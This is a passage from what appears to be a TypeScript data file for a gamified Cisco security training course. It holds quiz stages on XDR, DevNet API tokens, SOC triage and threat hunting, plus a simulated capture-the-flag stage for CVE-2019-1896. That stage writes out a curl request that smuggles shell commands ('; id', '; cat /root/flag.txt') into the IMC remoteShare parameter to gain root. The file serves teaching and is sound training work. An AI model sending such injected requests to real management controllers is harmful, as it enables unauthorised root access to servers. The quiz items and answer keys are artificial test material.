          text: "How can XDR automated response playbooks be weaponized against a defender?",
          options: [
            "Attackers intercept playbook HTTPS traffic and inject commands",
            "The attacker triggers quarantine and block playbooks, disrupting legitimate endpoints and network access — turning defensive tools into denial-of-service weapons",
            "Playbooks run with guest-level permissions and cannot affect production systems",
            "XDR playbooks can only read telemetry — they cannot execute response actions",
          ],
          correctIndex: 1,
          explanation: "Playbooks designed to quarantine endpoints, block IPs, and reset sessions are powerful — but executed by an adversary with XDR access, they become weapons for operational disruption. This is why XDR admin accounts require MFA and PAM protection.",
        },
        {
          id: "m29-q3",
          type: "Least Privilege",
          challenge: `  A DevSecOps team needs to integrate Cisco XDR with a SOAR
  platform. The SOAR only needs to read security alerts and
  create investigation cases — it never needs to execute
  response actions or access endpoint telemetry.`,
          text: "How should the XDR API token for this integration be scoped?",
          options: [
            "Full admin scope — simplifies integration and avoids permission errors",
            "Read-only scope for alerts and case management only — the SOAR does not need broader access",
            "No token — use shared admin credentials with the SOAR team instead",
            "Generate a new full-scope token weekly and rotate it manually",
          ],
          correctIndex: 1,
          explanation: "Principle of least privilege: the SOAR integration needs read access to alerts and case management. Granting full admin scope means a compromised SOAR can trigger response playbooks, read all telemetry, and modify policies — a disproportionate blast radius.",
        },
      ],
    },
  },

  // ─── Stage m30: CVE-2019-1896 — Cisco IMC REST API Command Injection ───────
  {
    epochId: "cisco-secops",
    wonder: { name: "Internet Archive", location: "San Francisco, California, USA", era: "2019 CE", emoji: "🏛️" },
    id: "stage-m30",
    order: 30,
    title: "API Injection",
    subtitle: "CVE-2019-1896 — Cisco IMC REST API Command Injection, CVSS 7.2",
    category: "cybersecurity",
    cveId: "CVE-2019-1896",
    cvssScore: 7.2,
    xp: 120,
    badge: { id: "badge-m-imc", name: "API Infiltrator", emoji: "🏛️" },
    challengeType: "ctf",
    info: {
      tagline: "A REST API designed to manage physical servers became a backdoor straight to the OS.",
      year: 2019,
      overview: [
        "CVE-2019-1896 is a command injection vulnerability in the REST API of the Cisco Integrated Management Controller (IMC). The IMC provides out-of-band management for Cisco UCS (Unified Computing System) servers — analogous to IPMI or Dell iDRAC. It allows administrators to remotely power cycle servers, mount virtual media, configure BIOS settings, and monitor hardware health from a separate management network.",
        "The vulnerability existed in how the IMC REST API handled certain request parameters: user-supplied input was passed directly to underlying OS commands without sanitization. An authenticated attacker with any privilege level could inject OS commands via API parameters and execute them as root on the IMC firmware.",
        "Out-of-band management interfaces are extremely high-value targets. Compromising the IMC gives an attacker persistent access that survives OS reinstalls, physical control equivalent (power cycling, virtual media mounting), and the ability to install firmware-level implants.",
      ],
      technical: {
        title: "Out-of-Band Management REST API Injection",
        body: [
          "The Cisco IMC exposes a REST API on a dedicated management network. The virtual media management endpoint accepted a `remoteShare` parameter specifying an ISO image path for remote CD mounting. This parameter was passed directly to a shell command without escaping.",
          "Injecting a semicolon into the `remoteShare` value broke out of the shell command context. A request with `remoteShare=192.168.1.1/iso/x.iso; id` executed both the mount command and the `id` command as root — confirming arbitrary OS command execution.",
          "From root on the IMC, an attacker can read SSH private keys from disk, install persistent startup scripts that survive reboots, modify firmware update mechanisms, and pivot to the UCS Manager management network that controls all servers in the data center chassis.",
        ],
        codeExample: {
          label: "CVE-2019-1896 — REST API remoteShare injection",
          code: `# Authenticated IMC REST API request — low-privilege account
# Inject OS command via remoteShare parameter

curl -k -X POST https://10.0.0.5/api/v2/virtual-media/mount \\
  -H "Authorization: Bearer <low-priv-token>" \\
  -H "Content-Type: application/json" \\
  -d '{"remoteShare": "192.168.1.1/iso/x.iso; id"}'

# Response:
# {"status": "ok", "message": "Mounting..."}
# uid=0(root) gid=0(root) groups=0(root)

# Extract flag:
# -d '{"remoteShare": "192.168.1.1/x; cat /root/flag.txt"}'

# Mitigation: upgrade IMC; restrict management network access with ACLs`,
        },
      },
      incident: {
        title: "Cisco UCS IMC RCE — Data Center Management Network Compromise",
        when: "August 2019 (Cisco advisory cisco-sa-20190821-imcs)",
        where: "Cisco UCS servers globally — enterprise data centers, colocation facilities",
        impact: "Low-privilege IMC credentials sufficient for full root access; firmware-level persistence, pivot to UCS management network",
        body: [
          "Cisco disclosed CVE-2019-1896 in August 2019 as part of a batch of UCS IMC vulnerabilities. The advisory noted that any authenticated user — including the default read-only monitoring account present on many UCS deployments — could exploit the injection.",
          "Because IMC management interfaces are often on dedicated networks with limited monitoring, the attack could go undetected for extended periods. The vulnerability required firmware updates to patch; no configuration workaround was available. Security teams were advised to restrict IMC network access to specific management workstations via ACLs.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "low-privilege IMC REST API token", type: "attacker" },
          { label: "IMC Virtual Media API", sub: "remoteShare param → OS shell passthrough", type: "system" },
          { label: "IMC Firmware", sub: "command injected as root", type: "victim" },
          { label: "Root Shell + Firmware Access", sub: "server infrastructure compromised", type: "result" },
        ],
      },
      timeline: [
        { year: 2019, event: "Aug: Cisco discloses CVE-2019-1896 — IMC REST API injection; firmware updates released", highlight: true },
        { year: 2019, event: "Cisco patches multiple UCS IMC vulnerabilities in same advisory batch" },
        { year: 2020, event: "Penetration testing reports confirm IMC injection as common finding in enterprise data centers" },
      ],
      keyTakeaways: [
        "Out-of-band management interfaces (IPMI, iDRAC, IMC) are Tier-0 infrastructure — restrict access with strict ACLs",
        "REST API input parameters that interact with OS commands must be validated with an allowlist",
        "IMC compromise gives firmware-level persistence that survives OS reinstalls and disk wipes",
        "Rotate IMC credentials regularly; use unique credentials per server, not shared monitoring accounts",
      ],
      references: [
        { title: "Cisco Advisory — cisco-sa-20190821-imcs", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190821-imcs" },
        { title: "NVD — CVE-2019-1896", url: "https://nvd.nist.gov/vuln/detail/CVE-2019-1896" },
      ],
    },
    ctf: {
      scenario: "A Cisco UCS server in a financial data center is running an unpatched IMC firmware vulnerable to CVE-2019-1896. You have recovered low-privilege IMC credentials from a network configuration backup. Use the REST API injection to achieve root and retrieve the flag.",
      hint: "Read the briefing, review the vulnerable API endpoint, then use api-inject to run OS commands via the remoteShare parameter.",
      hints: [
        "Start: cat briefing.txt",
        "Review the vulnerable API endpoint: cat api-endpoint.txt",
        "Confirm root access via injection: api-inject id",
        "Retrieve the flag: api-inject cat /root/flag.txt",
        "Run 'assemble' to view the collected flag",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{imc_", label: "Mission Brief — IMC REST API Target" },
        { trigger: "/api-endpoint.txt", value: "rest_", label: "API Endpoint — remoteShare Injection Point" },
        { trigger: "api-inject id", value: "inject_", label: "RCE Confirmed — uid=0(root)" },
        { trigger: "api-inject cat /root/flag.txt", value: "root_1896}", label: "Flag Retrieved" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: API INJECTION",
          "Target: Cisco UCS IMC REST API v2.0",
          "CVE: 2019-1896  CVSS: 7.2",
          "Auth: low-privilege monitoring credentials",
          "",
          "Vulnerable endpoint: POST /api/v2/virtual-media/mount",
          "Injection point: remoteShare JSON parameter",
          "Sequence: cat api-endpoint.txt → api-inject id → api-inject cat /root/flag.txt → assemble",
        ].join("\n"),
        "/api-endpoint.txt": [
          "POST /api/v2/virtual-media/mount",
          "Auth: Bearer <low-priv-token>",
          "",
          '{"remoteShare": "<ISO_URL>"}',
          "",
          "The remoteShare value is passed to the OS shell without sanitization.",
          'Example injection: {"remoteShare": "192.168.1.1/x.iso; id"}',
          "This executes both the mount command AND the injected command as root.",
        ].join("\n"),
      },
      dirs: {
        "/": [
          { name: "briefing.txt", isDir: false },
          { name: "api-endpoint.txt", isDir: false },
        ],
      },
      extraCommands: {
        "api-inject": (args: string[]) => {
          const cmd = args.join(" ");
          if (!cmd) return { lines: ["Usage: api-inject <os-command>", "Example: api-inject id"] };
          if (cmd === "id") {
            return {
              lines: [
                `POST /api/v2/virtual-media/mount`,
                `  {"remoteShare": "192.168.1.1/x.iso; id"}`,
                "HTTP 200 OK",
                "--- INJECTED OUTPUT ---",
                "uid=0(root) gid=0(root) groups=0(root)",
                "",
                ">> LEARN: The semicolon terminates the mount command and appends 'id'.",
                "   Both run as root — the IMC process runs with full OS privileges.",
                "   Real mitigation: strict parameter allowlist; segment management network.",
              ],
            };
          }
          if (cmd === "cat /root/flag.txt") {
            return {
              lines: [
                `POST /api/v2/virtual-media/mount`,
                `  {"remoteShare": "192.168.1.1/x.iso; cat /root/flag.txt"}`,
                "HTTP 200 OK",
                "--- INJECTED OUTPUT ---",
                "FLAG{imc_rest_inject_root_1896}",
                "",
                "Fragment collected. Run 'assemble' for the full flag.",
              ],
              solved: true,
            };
          }
          return {
            lines: [
              `POST /api/v2/virtual-media/mount`,
              `  {"remoteShare": "192.168.1.1/x.iso; ${cmd}"}`,
              "HTTP 200 OK",
              `--- INJECTED OUTPUT: ${cmd} (as root) ---`,
              "Try: api-inject id  →  api-inject cat /root/flag.txt",
            ],
          };
        },
      },
    },
  },

  // ─── Stage m31: Cisco DevNet API Security — Quiz ──────────────────────────
  {
    epochId: "cisco-secops",
    wonder: { name: "DEF CON / Caesar's Forum", location: "Las Vegas, Nevada, USA", era: "2023 CE", emoji: "🎰" },
    id: "stage-m31",
    order: 31,
    title: "The API Keymaster",
    subtitle: "Cisco DevNet — REST API Authentication, Token Security, and Network Automation Risks",
    category: "cybersecurity",
    xp: 90,
    badge: { id: "badge-m-devnet", name: "DevNet Guardian", emoji: "🎰" },
    challengeType: "quiz",
    info: {
      tagline: "Automating your network with APIs opens your infrastructure to API-level attacks.",
      year: 2023,
      overview: [
        "Cisco DevNet is the developer program and API ecosystem for Cisco's networking portfolio. Through DevNet, engineers automate networks using REST APIs, YANG data models, NETCONF/RESTCONF, and Cisco-specific SDKs for DNA Center, Catalyst Center, Meraki, APIC-EM, and NSO (Network Services Orchestrator).",
        "Network automation introduces a critical new attack surface: REST API credentials, automation scripts, and CI/CD pipelines interacting with production network infrastructure. A leaked Cisco DNA Center API token gives an attacker the ability to reconfigure the entire campus network — changing VLANs, ACLs, routing policies, and QoS settings — with the same authority as a network administrator.",
        "DevNet best practices emphasize securing API tokens using vault storage, enforcing short token lifetimes, implementing RBAC on API scopes, and auditing all API calls via YANG Telemetry and syslog.",
      ],
      technical: {
        title: "DevNet API Security Architecture",
        body: [
          "Cisco network management platforms (DNA Center, Meraki, APIC) use OAuth 2.0 or token-based authentication. API tokens are typically bearer tokens: any request presenting the token is granted access without further verification.",
          "Common token security failures: hardcoded in automation scripts, stored in plaintext in Git repositories, granted excessive scope (read-write when read-only suffices), long or non-expiring lifetimes, and no rotation policy.",
          "YANG (Yet Another Next Generation) is the data modeling language used in NETCONF and RESTCONF. YANG models define the schema for network device configuration — understanding YANG is essential for auditing what a given API call will change on a device.",
        ],
        codeExample: {
          label: "Cisco DNA Center — correct bearer token handling",
          code: `# WRONG — hardcoded token in script committed to Git
DNAC_TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."  # leaked!
curl -H "X-Auth-Token: $DNAC_TOKEN" https://dnac.corp/dna/intent/api/v1/network-device

# CORRECT — token fetched from vault at runtime, scoped to read-only
export DNAC_TOKEN=$(vault kv get -field=token secret/dnac-read-only)
curl -H "X-Auth-Token: $DNAC_TOKEN" \\
     https://dnac.corp/dna/intent/api/v1/network-device

# Scope read-only tokens for monitoring; write tokens for change management only
# Rotate every 90 days; revoke immediately if leaked
# Audit all DNAC API calls in Splunk/SecureX`,
        },
      },
      incident: {
        title: "DNA Center Token Leak — Campus Network Reconfiguration by Attacker",
        when: "2022–2023 (multiple reported red team findings)",
        where: "Enterprise campus networks using Cisco DNA Center automation",
        impact: "Leaked tokens found in GitHub; attackers demonstrated ability to modify VLAN configurations and ACLs across entire campus networks",
        body: [
          "Multiple penetration testing engagements and red team exercises have found Cisco DNA Center and Meraki API tokens hardcoded in infrastructure-as-code repositories, CI/CD pipeline configurations, and monitoring scripts that were accidentally exposed publicly. Because these tokens carry network admin authority, the blast radius is far greater than a typical application API key.",
          "In one documented red team exercise, the testers used a DNA Center read-write token found in a public GitHub repo to modify VLAN configurations and ACL rules on 200+ switches in 15 minutes — demonstrating complete campus network control with no other credentials needed. The organization had no monitoring of DNA Center API activity.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "Cisco DNA Center token (from Git)", type: "attacker" },
          { label: "DNA Center REST API", sub: "bearer token — no additional auth", type: "system" },
          { label: "Campus Network Devices", sub: "VLANs, ACLs, routing — all configurable", type: "victim" },
          { label: "Full Network Control", sub: "200+ switches reconfigured in 15 min", type: "result" },
        ],
      },
      timeline: [
        { year: 2019, event: "Cisco DNA Center API launched — full network automation via REST" },
        { year: 2022, event: "First documented cases of DNA Center tokens leaked in public GitHub repos" },
        { year: 2023, event: "Cisco DevNet publishes API security best practices guide; CISA issues guidance on network automation credential hygiene", highlight: true },
      ],
      keyTakeaways: [
        "Network automation API tokens carry network admin authority — store them in a secrets vault, never in scripts or Git",
        "Scope tokens to minimum required permissions: read-only for monitoring, write-scoped for change management",
        "Monitor all DNA Center API activity in your SIEM — it should be treated like privileged user activity",
        "Use NETCONF/RESTCONF with YANG models for standards-compliant automation that is auditable and reproducible",
      ],
      references: [
        { title: "Cisco DevNet — API Authentication Guide", url: "https://developer.cisco.com/docs/dna-center/#!authentication/authentication" },
        { title: "Cisco Meraki — API Best Practices", url: "https://developer.cisco.com/meraki/api-v1/#!getting-started/authorization" },
        { title: "NETCONF RFC 6241", url: "https://datatracker.ietf.org/doc/html/rfc6241" },
      ],
    },
    quiz: {
      questions: [
        {
          id: "m31-q1",
          type: "Token Security",
          challenge: `  A network engineer writes an automation script that reads device
  inventory from Cisco DNA Center. The script hardcodes the DNA
  Center API token and is committed to the company's internal
  (but world-readable) GitHub repository.`,
          text: "What is the primary security risk of this approach?",
          options: [
            "The script will fail if the DNA Center IP address changes",
            "Anyone who can read the repository can use the token to query or reconfigure the entire managed network",
            "Git cannot store API tokens — they must be in environment variables",
            "DNA Center tokens expire after 24 hours, making the script unreliable",
          ],
          correctIndex: 1,
          explanation: "A DNA Center bearer token in source code is a Tier-0 credential exposure. Anyone who finds the repo can use it to query device configurations, modify network policies, and reconfigure VLANs and ACLs across the entire campus.",
        },
        {
          id: "m31-q2",
          type: "Protocol Knowledge",
          challenge: `  A DevNet engineer needs to automate configuration backups and
  policy changes across 500 Cisco switches. Management wants the
  automation to be standards-compliant and auditable, with a
  structured data format that is parseable by other tools.`,
          text: "Which Cisco network management protocol is the correct choice for standards-compliant network automation?",
          options: [
            "SNMP v3 — widely supported, easy to implement",
            "NETCONF / RESTCONF with YANG data models — standards-based, structured, auditable",
            "Telnet CLI scripting with Expect scripts",
            "TFTP configuration file transfer with custom parsing",
          ],
          correctIndex: 1,
          explanation: "NETCONF (RFC 6241) and RESTCONF (RFC 8040) use YANG models for structured, machine-readable configuration management. They provide transactional semantics, rollback support, and schema validation — the modern standard for network automation.",
        },
        {
          id: "m31-q3",
          type: "Least Privilege",
          challenge: `  A network operations team needs two different automation scripts:
  1. A read-only monitoring script that reports device health
  2. A change management script that pushes ACL updates

  Currently both scripts use the same full-admin DNA Center token.`,
          text: "What is the correct approach to API token scoping for these two use cases?",
          options: [
            "Keep the same token — it simplifies credential management",
            "Create separate tokens: read-only scope for monitoring, write-scoped token for change management; store both in a vault",
            "Use username/password authentication instead of tokens for both",
            "Generate a new full-admin token for each script execution and immediately revoke it",
          ],
          correctIndex: 1,
          explanation: "Least privilege: the monitoring script only needs read access — giving it a full-admin token means a compromised monitoring host can reconfigure the entire network. Separate scoped tokens limit blast radius and allow independent rotation and revocation.",
        },
        {
          id: "m31-q4",
          type: "CI/CD Security",
          challenge: `  A DevSecOps team builds a CI/CD pipeline that automatically
  deploys ACL changes to production routers via the DNA Center API
  whenever code is merged to the 'main' branch.`,
          text: "What security control is most critical to add to this pipeline?",
          options: [
            "Compress all API payloads with gzip to reduce bandwidth",
            "Require a mandatory human approval gate before the pipeline pushes write-permission API calls to production network devices",
            "Run the pipeline as root to ensure it has sufficient system permissions",
            "Log all pipeline output to a text file on the build server",
          ],
          correctIndex: 1,
          explanation: "A CI/CD pipeline with write access to production network infrastructure is a critical control point. A mandatory human approval gate (or out-of-band approval workflow) prevents automated pipelines from being weaponized by a supply chain compromise or stolen API token.",
        },
      ],
    },
  },

  // ─── Stage m32: CyberOps — SOC Analyst SIEM Triage — Quiz ────────────────
  {
    epochId: "cisco-secops",
    wonder: { name: "IBM Security Operations Center", location: "Cambridge, Massachusetts, USA", era: "2024 CE", emoji: "🔍" },
    id: "stage-m32",
    order: 32,
    title: "Alert Avalanche",
    subtitle: "CyberOps Associate — SOC Tier 1 SIEM Alert Triage and Incident Classification",
    category: "cybersecurity",
    xp: 90,
    badge: { id: "badge-m-soc", name: "SOC Analyst", emoji: "🔍" },
    challengeType: "quiz",
    info: {
      tagline: "A SOC analyst who can't prioritize is just watching alerts scroll by.",
      year: 2024,
      overview: [
        "The Cisco CyberOps Associate certification prepares analysts for Tier 1 and Tier 2 Security Operations Center roles. Core competencies include SIEM alert triage, incident classification, network traffic analysis, log interpretation, and basic threat hunting using Cisco SecureX, Splunk, and the ELK stack.",
        "SIEM platforms collect, normalize, and correlate logs from across an organization: firewalls, endpoints, DNS servers, authentication systems, and cloud services. Cisco SecureX/XDR integrates with Splunk and Cisco's analytics for unified alert management across the entire security portfolio.",
        "A Tier 1 SOC analyst's primary job is to triage incoming alerts: determine whether an alert represents a true positive (real attack), false positive (benign activity that triggered a rule), and whether to escalate to Tier 2 for deep investigation.",
      ],
      technical: {
        title: "SIEM Triage and the Incident Response Lifecycle",
        body: [
          "SIEM alerts are generated by correlation rules matching patterns in log data. Common rule types: threshold rules (>100 failed logins in 5 minutes), sequence rules (login → mass file access → external data transfer), and behavioral baselines (statistical anomaly detection from normal activity profiles).",
          "The NIST incident response lifecycle has four phases: Preparation → Detection & Analysis → Containment/Eradication/Recovery → Post-Incident Activity. SOC Tier 1 analysts operate in Detection & Analysis — receiving, triaging, and escalating.",
          "MITRE ATT&CK provides a structured vocabulary for describing attacker TTPs (Tactics, Techniques, Procedures). Mapping alerts to ATT&CK techniques enables faster triage and more accurate severity classification.",
        ],
        codeExample: {
          label: "Splunk SPL — SIEM query for lateral movement detection",
          code: `// Splunk SPL: detect lateral movement via multiple RDP logons from one source
index=windows EventCode=4624 Logon_Type=10
| stats dc(ComputerName) as dest_count, values(ComputerName) as dest_hosts by Account_Name, src_ip
| where dest_count > 3
| eval risk="lateral_movement_candidate"
| table Account_Name, src_ip, dest_count, dest_hosts, risk

// EventCode 4624 Logon_Type=10 = Remote Interactive (RDP)
// >3 unique destination hosts from same source in 1 hour = suspicious
// Correlate with ATT&CK T1021.001 (Remote Services: RDP)`,
        },
      },
      incident: {
        title: "Alert Fatigue Contributes to Undetected Intrusion",
        when: "2023 (composite of multiple incident reports)",
        where: "Enterprise SOC — financial services sector",
        impact: "Attacker dwelled for 47 days undetected; SOC had generated 1,200 true-positive alerts that were treated as false positives due to false-positive rate exceeding 95%",
        body: [
          "In a widely-cited 2023 incident investigation, a SOC with a 95%+ false-positive rate for their brute-force detection rule had trained analysts to dismiss nearly all failed-login alerts. When an actual credential stuffing attack succeeded and the attacker began lateral movement, the same rule type fired — and was dismissed. The attacker dwelled for 47 days before a Tier 2 analyst noticed an anomalous data staging pattern during unrelated review.",
          "The root cause was an underticketed rule tuning task that had never been prioritized. The lesson: false-positive rate is a first-class security metric. A SOC generating 1,000 alerts per day where 950 are false positives will miss real incidents — not through analyst incompetence, but through rational signal prioritization.",
        ],
      },
      diagram: {
        nodes: [
          { label: "SIEM Rule Fires", sub: "true positive mixed with 95% false positives", type: "attacker" },
          { label: "Tier 1 Analyst", sub: "dismisses alert — known false positive pattern", type: "system" },
          { label: "Active Intrusion", sub: "attacker lateral movement — 47 day dwell", type: "victim" },
          { label: "Late Detection", sub: "discovered during unrelated Tier 2 review", type: "result" },
        ],
      },
      timeline: [
        { year: 2020, event: "Industry study: average SOC false-positive rate exceeds 45%; analyst alert fatigue documented" },
        { year: 2022, event: "Cisco CyberOps Associate certification updated to include alert tuning and triage methodology" },
        { year: 2023, event: "CISA SOC effectiveness guidance published; rule tuning frameworks formalized", highlight: true },
        { year: 2024, event: "AI-assisted triage tools reduce false-positive exposure in Cisco XDR platform" },
      ],
      keyTakeaways: [
        "False-positive rate is a security metric — a SOC with >50% false positives will develop dangerous dismissal habits",
        "Use MITRE ATT&CK to contextualize alerts within kill chain phases, enabling accurate severity scoring",
        "Triage playbooks reduce analyst decision fatigue for common alert types and ensure consistent escalation decisions",
        "Tier 1 ↔ Tier 2 feedback loops are essential for continuous rule tuning — close the loop after every escalation",
      ],
      references: [
        { title: "NIST SP 800-61r2 — Computer Security Incident Handling Guide", url: "https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final" },
        { title: "Cisco CyberOps Associate Certification", url: "https://www.cisco.com/c/en/us/training-events/training-certifications/certifications/associate/cyberops-associate.html" },
        { title: "MITRE ATT&CK Navigator", url: "https://mitre-attack.github.io/attack-navigator/" },
      ],
    },
    quiz: {
      questions: [
        {
          id: "m32-q1",
          type: "Alert Triage",
          challenge: `  SIEM ALERT #4471:
  Timestamp: 03:47 AM
  User: admin
  Source IP: 185.220.101.5 (Tor exit node — confirmed)
  Action: Successful login, then accessed 12,000 files in 8 min
  Baseline: admin typically accesses ~40 files/day during business hours`,
          text: "As a Tier 1 SOC analyst, how should you classify this alert?",
          options: [
            "False positive — admin users access files at all hours",
            "True positive — Tor login + 300x baseline file access at 3 AM indicates credential theft and data staging; escalate immediately",
            "Informational — log it for the morning shift to review",
            "True negative — the SIEM rule fired correctly but no threat is present",
          ],
          correctIndex: 1,
          explanation: "Three simultaneous indicators: Tor exit node (anonymization), 3 AM timestamp (anomalous hour), 12,000 files in 8 minutes (300x normal baseline). This matches ATT&CK T1078 (Valid Accounts) + T1530 (Data from Cloud Storage). Escalate and initiate containment.",
        },
        {
          id: "m32-q2",
          type: "NIST Framework",
          challenge: `  A Tier 1 SOC analyst's shift starts with 200 new SIEM alerts.
  Their job is to review each alert, determine severity, and decide
  whether to close it (false positive), document it (low severity),
  or open a P1 incident (escalate to Tier 2).`,
          text: "Which NIST incident response phase does this Tier 1 activity primarily fall within?",
          options: [
            "Preparation — setting up SIEM rules and analyst playbooks",
            "Detection & Analysis — receiving alerts, triaging severity, and escalating confirmed incidents",
            "Containment, Eradication & Recovery — isolating affected systems",
            "Post-Incident Activity — writing after-action reports",
          ],
          correctIndex: 1,
          explanation: "Tier 1 analysts work in Detection & Analysis: receiving SIEM alerts, triaging true/false positives using playbooks, and escalating confirmed incidents to Tier 2 for containment and eradication.",
        },
        {
          id: "m32-q3",
          type: "Alert Fatigue",
          challenge: `  A SOC's brute-force detection rule fires 1,000 times per day.
  950 of these are from an authorized penetration testing tool
  that was never added to the SIEM exclusion list.
  Analysts have learned to dismiss nearly all brute-force alerts.`,
          text: "What operational security risk does this create, and what is the correct fix?",
          options: [
            "No risk — experienced analysts can distinguish real attacks from the pen-testing tool",
            "Alert fatigue: analysts will dismiss real brute-force attacks as pen-test noise. Fix: add the authorized scanner to an exclusion list and retrain analysts on the tuned rule",
            "The SIEM is running out of storage — upgrade the hardware",
            "The pen-testing tool should be disabled so it doesn't interfere with SIEM operations",
          ],
          correctIndex: 1,
          explanation: "A 95% false-positive rate for a rule trains analysts to dismiss it. When a real brute-force attack occurs and fires the same rule, it will be dismissed by habit. The fix is to add the authorized scanner to an exclusion list — immediately restoring the signal value of the rule.",
        },
        {
          id: "m32-q4",
          type: "False Positive Classification",
          challenge: `  SIEM ALERT #8823:
  Port scan detected from 10.10.5.22 targeting 10.0.0.0/24
  Scanning ports: 22, 80, 443, 8080, 3389
  Timestamp: Tuesday 2:00 AM (weekly scheduled window)

  Asset inventory shows: 10.10.5.22 = Tenable Nessus vulnerability scanner`,
          text: "How should this alert be classified?",
          options: [
            "True positive — port scans are always malicious activity",
            "False positive — known benign authorized scanner activity; add to SIEM exclusion list",
            "True negative — the rule should not have fired at all",
            "Undetermined — escalate to Tier 2 for investigation",
          ],
          correctIndex: 1,
          explanation: "This is a false positive: an authorized vulnerability scanner running during its scheduled maintenance window. The fix is adding the Nessus scanner IP to the SIEM exclusion list for port scan rules — turning a noisy false positive into zero alerts.",
        },
      ],
    },
  },

  // ─── Stage m33: CyberOps — Threat Hunting with IOC Analysis — Quiz ────────
  {
    epochId: "cisco-secops",
    wonder: { name: "Mandiant (Google Cloud) HQ", location: "Reston, Virginia, USA", era: "2024 CE", emoji: "🕵️" },
    id: "stage-m33",
    order: 33,
    title: "Hunt or Be Hunted",
    subtitle: "CyberOps Associate — Threat Hunting, IOC Identification, and MITRE ATT&CK Mapping",
    category: "cybersecurity",
    xp: 100,
    badge: { id: "badge-m-hunt", name: "Threat Hunter", emoji: "🕵️" },
    challengeType: "quiz",
    info: {
      tagline: "Threat hunters don't wait for alerts — they assume compromise and go looking for evidence.",
      year: 2024,
      overview: [
        "Threat hunting is the proactive discipline of searching for attacker activity that has evaded automated detection. Unlike reactive incident response triggered by SIEM alerts, threat hunters form hypotheses based on threat intelligence, adversary TTPs from MITRE ATT&CK, and anomalies in telemetry — then actively query logs, endpoint data, and network captures to confirm or refute them.",
        "Indicators of Compromise (IOCs) are forensic artifacts that suggest a system has been compromised: malicious IP addresses, file hashes of known malware, suspicious registry keys, anomalous DNS queries, and unusual outbound connections. IOCs are curated in threat intelligence platforms like Cisco SecureX Threat Intelligence, MISP, and VirusTotal.",
        "Cisco CyberOps Associate covers hunt methodology: building hypotheses from ATT&CK TTPs, querying endpoint telemetry, identifying lateral movement in authentication logs, and detecting C2 beaconing through DNS and NetFlow analysis.",
      ],
      technical: {
        title: "Hunt Methodology and C2 Detection",
        body: [
          "A threat hunt begins with a hypothesis: 'Assume an attacker gained a foothold via phishing. What evidence would they leave in DNS queries, process execution logs, and network flows?' The hunter queries data sources to confirm or refute that hypothesis.",
          "Command-and-Control (C2) beaconing is a high-value hunt target. Malware checks in with a C2 server at regular intervals using HTTP/HTTPS or DNS. Beaconing leaves distinctive patterns: regular connection intervals (e.g., every 60 seconds), connections to recently registered domains, or DNS queries with high-entropy names from DGA (Domain Generation Algorithm) malware.",
          "Lateral movement produces authentication artifacts: pass-the-hash shows as NTLM authentication to multiple hosts in a short window; pass-the-ticket appears as Kerberos TGS requests for service accounts; RDP lateral movement shows as Event ID 4624 (logon type 10) on destination hosts.",
        ],
        codeExample: {
          label: "Splunk SPL — C2 beaconing detection via DNS entropy analysis",
          code: `// Hunt: find high-entropy DNS queries (DGA beaconing)
index=dns
| eval domain_len=len(query), query_entropy=tonumber(...)
| where domain_len > 20 AND query_entropy > 3.5
| stats count as query_count, values(query) as domains by src_ip
| where query_count > 50
| eval hunt_tag="possible_dga_c2_beaconing"

// Additional: beacon interval analysis
index=proxy
| stats count, min(_time) as first, max(_time) as last, dc(dest_host) as host_count by src_ip
| eval avg_interval=(last-first)/(count-1)
| where avg_interval > 55 AND avg_interval < 65  // ~60s beacon interval
| eval hunt_tag="regular_c2_beacon"`,
        },
      },
      incident: {
        title: "APT C2 Beacon Dwell — 200 Days Before Hunt Discovery",
        when: "2023 (incident response report, anonymized)",
        where: "Fortune 500 financial services organization",
        impact: "APT group maintained C2 access for 187 days via DNS-tunneled DGA beaconing; discovered only through proactive threat hunting, not SIEM alerts",
        body: [
          "A threat hunting team investigating anomalous DNS volume identified a workstation making DNS queries to high-entropy domain names at 58-second intervals — consistent with DGA-based C2 beaconing. The SIEM had never fired an alert: the beacon volume was below threshold rules and the domains were not in any threat feed.",
          "Investigation revealed the host had been compromised 187 days earlier via a spear-phishing attachment. The attacker had maintained persistent access through a C2 framework using DGA to generate fresh domains daily, preventing blocklist-based detection. Only the threat hunter's entropy-based query analysis surfaced the activity.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Threat Hunter", sub: "hypothesis: assume C2 beacon present", type: "attacker" },
          { label: "DNS Telemetry", sub: "high-entropy queries at 58s intervals", type: "system" },
          { label: "APT C2 Channel", sub: "DGA beacon — 187 day dwell", type: "victim" },
          { label: "Hunt Confirmed", sub: "zero SIEM alerts in 187 days", type: "result" },
        ],
      },
      timeline: [
        { year: 2014, event: "Mandiant popularizes 'assume breach' methodology — foundation of modern threat hunting" },
        { year: 2020, event: "Cisco CyberOps Associate adds threat hunting module; ATT&CK hunt frameworks published" },
        { year: 2023, event: "Industry: average attacker dwell time 197 days; proactive hunting reduces to <60 days in mature programs", highlight: true },
        { year: 2024, event: "Cisco XDR adds AI-assisted hunt automation; DGA detection built into Umbrella DNS layer" },
      ],
      keyTakeaways: [
        "Threat hunting is proactive — assume breach and search for evidence rather than waiting for alerts",
        "DGA-based C2 beaconing evades blocklists; hunt with DNS entropy analysis and beacon interval detection",
        "Windows Event ID 4624 Logon Type 10 is the key lateral movement artifact for RDP-based pivoting",
        "Average attacker dwell time without proactive hunting: 197 days; with hunting: under 60 days",
      ],
      references: [
        { title: "Cisco CyberOps Associate — Threat Hunting Module", url: "https://www.cisco.com/c/en/us/training-events/training-certifications/certifications/associate/cyberops-associate.html" },
        { title: "MITRE ATT&CK — C2 Techniques", url: "https://attack.mitre.org/tactics/TA0011/" },
        { title: "Mandiant M-Trends 2024 Report", url: "https://www.mandiant.com/m-trends" },
      ],
    },
    quiz: {
      questions: [
        {
          id: "m33-q1",
          type: "Hunt Methodology",
          challenge: `  A Tier 2 SOC analyst proposes starting a threat hunt with the
  hypothesis: "An APT group known to target our industry uses
  DGA-based C2 over DNS. Assume at least one endpoint has been
  compromised for >30 days. What evidence would they leave?"`,
          text: "What distinguishes this threat hunting approach from reactive SIEM alert triage?",
          options: [
